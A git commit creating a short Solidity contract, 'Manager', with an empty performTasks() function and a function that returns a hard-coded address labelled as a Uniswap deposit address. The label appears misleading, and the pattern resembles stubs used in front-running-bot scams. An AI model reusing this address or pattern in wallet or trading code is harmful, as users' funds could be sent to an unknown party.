b58ba59d16d7aed259d03292e17370d8620183ce
kitmir <54212540+kitmir@users.noreply.github.com>
2022-01-03 19:54:16 +0100

    Create factoryV2.sol

---
+++ factoryV2.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x3568D86e3Cfe115e9afC79d3f001f973B4d889e0;
+	}
+}
